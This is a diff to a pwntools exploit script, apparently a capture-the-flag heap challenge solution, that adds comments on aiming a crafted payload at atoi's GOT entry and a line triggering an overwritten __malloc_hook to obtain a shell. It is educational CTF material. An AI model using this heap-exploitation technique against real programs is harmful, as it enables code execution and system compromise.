@@ -49,7 +49,12 @@ def pwn():
 	alloc(0x50, p64(fast_chunk), 'red')
 	alloc(0x50, 'D'*8, 'red')
 	alloc(0x50, 'E'*8, 'red')
-
+	
+	#	 Need to craft the payload in such a way that the
+	# 	 below pointer arithmetic points to the target GOT entry
+	#
+	# 	mov     rax, qword [rax*8+0x6020e0]
+	#	mov     rdx, qword [rax+0x8]
 	payload  = p8(0)*6
 	payload += p64(0x602120)
 	payload += p64(array)
@@ -57,7 +62,17 @@ def pwn():
 	payload  = payload.ljust(0x50, '\x00')
 
 	alloc(0x50, payload, 'red')
-
+	
+	##################################################################################
+	#
+	#	0x6020e0 <flowerlist>:		0x0000000000603010	0x00000000006030a0
+	#	0x6020f0 <flowerlist+16>:	0x0000000000603130	0x00000000006031c0
+	#	0x602100 <flowerlist+32>:	0x00000000006031f0	0x0000000000603220
+	#	0x602110 <flowerlist+48>:	0x0000000000603250	0x0000000000602120 <-- [0x602120 + 8] == 0x6020800
+	#	0x602120 <flowerlist+64>:	0x00000000006020e0	0x0000000000602080 <-- atoi's GOT entry
+	#
+	##################################################################################
+	
 	# Leak atoi's address
 	atoi        = dump()
 	libc        = atoi - atoi_off
@@ -81,7 +96,10 @@ def pwn():
 	alloc(0x68, 'E'*8, 'red')
 	# __malloc_hook => magic
 	alloc(0x68, 'H'*0x13+p64(magic), 'yellow')	
-
+	
+	# Trigger __malloc_hook
+	r.sendline('1')
+	
 	r.interactive()
 
 if __name__ == "__main__":
